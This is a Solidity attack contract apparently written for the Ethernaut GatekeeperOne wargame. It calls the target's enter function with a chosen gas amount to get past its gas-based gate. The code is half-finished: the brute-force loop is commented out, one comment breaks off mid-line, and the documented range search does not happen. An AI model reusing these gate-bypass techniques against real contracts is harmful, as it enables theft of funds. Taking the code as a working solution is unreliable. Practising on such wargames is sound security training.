// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneHacker {
    GatekeeperOne gatekeeper;
    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperOne(_gatekeeper);
    }

    // Tries a range of gas values and returns the first gas amount that worked (or 0 if none)
    function bruteForceEnter(bytes8 key, uint256 gasAmt) public returns (uint256) {
        // const base = 8191;
        // for (uint256 gasAmt = startGas; gasAmt <= endGas; gasAmt++) {
            // uint256 finalGasAmount = gasAmount + 
            (bool success, bytes memory returndata) = address(gatekeeper).call{gas: gasAmt}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                return gasAmt;  // Found gas amount that passed gateTwo
            }
            if (!success) {
            if (returndata.length > 0) {
                // Bubble up revert reason from returndata
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert("Call failed without revert reason");
            }
}
        // }
        require(false, "No success in range");
        return 0;
    }

    
}